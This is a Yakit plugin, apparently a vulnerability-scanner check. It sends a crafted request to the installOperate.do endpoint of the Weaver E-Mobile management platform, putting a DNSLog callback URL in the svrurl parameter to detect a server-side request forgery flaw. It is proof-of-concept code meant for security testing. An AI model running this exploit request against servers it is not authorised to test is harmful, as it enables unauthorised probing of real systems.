# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /install/installOperate.do?svrurl={{params(reverseURL)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close

`

	r0_flag = false 
	rand_Payload=str.RandStr(10)
	server,token,err = risk.NewDNSLogDomain()
	die(err)
	yakit.Info("dnslog server addr: %v ",server)
	yakit.Info("dnslog server check token: %v", token)
	reverseURL = "http://" + rand_Payload+"."+server

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr,"reverseURL":reverseURL}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
	time.sleep(10)

	detail, _ := risk.CheckDNSLogByToken(token)

	if len(detail) > 0{
        r0_flag = true
    }

    if r0_flag{
        yakit.Info("%v found 泛微E-Mobile移动管理平台installOperate.do SSRF漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("泛微E-Mobile移动管理平台installOperate.do SSRF漏洞"),
        risk.severity("medium"),
        risk.titleVerbose("泛微E-Mobile移动管理平台installOperate.do SSRF漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
